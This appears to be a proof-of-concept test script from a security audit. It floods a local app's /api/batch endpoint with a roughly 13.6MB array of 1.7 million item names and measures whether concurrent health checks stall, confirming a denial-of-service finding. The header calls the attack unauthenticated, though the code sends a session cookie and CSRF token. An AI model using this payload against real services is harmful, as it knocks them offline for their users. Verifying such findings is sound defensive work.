// F1: unauthenticated one-request DoS via /api/batch with an unbounded `items` array.
// Proof: while a batch request with ~1.7M repeated item names (under 20MB body) is being processed
// (JSON.parse + a synchronous existsSync loop blocking the event loop), concurrent cheap
// GET /api/health requests launched at the same time are measurably delayed (> 2s) until the
// batch request finishes, instead of returning immediately.
import { writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { setupEnv, session } from './helper'

const base = setupEnv('f1')

async function main() {
  const s = await session()
  const { app, cookie, csrf } = s
  writeFileSync(join(base, 'storage', 'public', 'a.txt'), 'hello')

  const N = 1_700_000 // ~13.6MB JSON body, well under the 20MB cap
  const items = new Array(N).fill('a.txt')
  const payload = JSON.stringify({ space: 'public', path: '/', items })
  console.error('payload bytes:', payload.length)

  const t0 = Date.now()
  const batchPromise = app.handle(new Request('http://localhost/api/batch', {
    method: 'POST',
    headers: { 'content-type': 'application/json', cookie, 'x-csrf-token': csrf },
    body: payload,
  }))

  // fire a handful of cheap requests concurrently, started at the same instant as the batch request
  const healthLatencies: number[] = []
  const healthPromises = Array.from({ length: 5 }, () => {
    const ti = Date.now()
    return app.handle(new Request('http://localhost/api/health')).then(() => {
      healthLatencies.push(Date.now() - ti)
    })
  })

  await Promise.all(healthPromises)
  const batchRes = await batchPromise
  console.error('batch status', batchRes.status, 'total ms', Date.now() - t0)
  console.error('concurrent /api/health latencies (ms):', healthLatencies)

  const maxLatency = Math.max(...healthLatencies)
  if (maxLatency > 2000) {
    console.error(`DoS confirmed: concurrent cheap requests were blocked for ~${maxLatency} ms by one batch request`)
    process.exit(42)
  }
  console.error('no significant blocking observed, maxLatency=', maxLatency)
  process.exit(0)
}

main()
